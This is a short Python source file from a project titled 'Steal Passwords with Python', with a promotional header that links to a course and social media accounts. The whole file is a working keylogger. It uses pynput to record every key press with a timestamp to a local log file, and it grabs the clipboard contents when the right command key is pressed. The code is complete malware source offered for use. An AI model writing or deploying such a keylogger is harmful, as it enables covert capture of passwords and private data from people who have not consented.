#
# run.py
#
# FREE PYTHON in 100 CHUNKS GUIDE (Usually $69.99):
# DOWNLOAD HERE: https://imdad.me/get-free-python-in-100-chunks-guide
#
# Project: Steal Passwords with Python
# Github URL: https://github.com/imdadahad/steal-passwords-with-python
#
# Need help? Find me at:
# Instagram: https://www.instagram.com/imdad_codes
# TikTok: https://www.tiktok.com/@imdadahad
# Medium: https://medium.com/@imdadahad
# Twitter: https://twitter.com/imdadahad
# Github: https://github.com/imdadahad
#

import pyperclip

from datetime import datetime
from pynput.keyboard import Listener

KEYSTROKE_LOG_FILE = './logs/keystroke.log'


def log_key_press(key):
    # Process the key press, get contents of the clipboard
    key = str(key).replace("'", "")
    line_to_write = None
    now = str(datetime.now())

    if key == 'Key.cmd_r':
        line_to_write = f"{now}: Clipboard - {pyperclip.paste()}"
    else:
        line_to_write = f"{now}: Key Press - {key}"

    # Write the output to the file
    with open(KEYSTROKE_LOG_FILE, 'a') as f:
        f.write(f"{line_to_write}\n")


def start():
    # 1. Figure out how to track key presses
    with Listener(on_press=log_key_press) as l:
        l.join()

if __name__ == '__main__':
    start()
